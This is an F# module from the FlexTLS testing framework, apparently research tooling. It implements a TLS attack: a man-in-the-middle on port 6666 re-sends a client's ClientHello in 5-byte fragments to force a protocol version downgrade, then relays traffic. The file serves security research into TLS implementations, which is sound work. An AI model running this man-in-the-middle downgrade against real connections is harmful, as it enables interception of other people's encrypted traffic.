(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_FragmentClientHello

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexHandshake
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets

type Attack_FragmentClientHello =
    class

    static member client (server_name:string, ?port:int, ?fp:fragmentationPolicy) : state =
        let port = defaultArg port FlexConstants.defaultTCPPort in
        let fp = defaultArg fp (All(5)) in

        // Start TCP connection with the server
        let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in

        // Typical RSA key exchange messages

        // Ensure we use RSA
        let fch = {FlexConstants.nullFClientHello with
            ciphersuites = Some([TLS_RSA_WITH_AES_128_CBC_SHA]) } in

        let st,nsc,fch   = FlexClientHello.send(st,fch,fp=fp) in
        let st,nsc,fsh   = FlexServerHello.receive(st,fch,nsc) in
        let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
        let st,fshd      = FlexServerHelloDone.receive(st) in
        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
        let st,_         = FlexCCS.send(st) in

        // Start encrypting
        let st           = FlexState.installWriteKeys st nsc in

        let st,ffC       = FlexFinished.send(st,nsc,Client) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nsc in

        let st,ffS       = FlexFinished.receive(st,nsc,Server) in
        st

    static member runMITM (accept, server_name:string, ?port:int) : state * state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start being a Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listen_port=6666,server_cn=server_name,server_port=port) in

        // Receive the Client Hello and check that the protocol version is high enough
        let sst,nsc,sch = FlexClientHello.receive(sst) in
        if not (FlexClientHello.getPV sch = TLS_1p2 || FlexClientHello.getPV sch = TLS_1p1) then
            failwith "Fragmented ClientHello should use TLS > 1.0 to demonstrate the downgrade"
        else

        // Reuse the honest client hello message, but apply fragmentation
        let cst = FlexHandshake.send(cst,sch.payload,One(5)) in
        let cst = FlexHandshake.send(cst) in

        // Forward the rest of the handshake and the application data
        FlexConnection.passthrough(cst.ns,sst.ns);
        sst,cst

    end
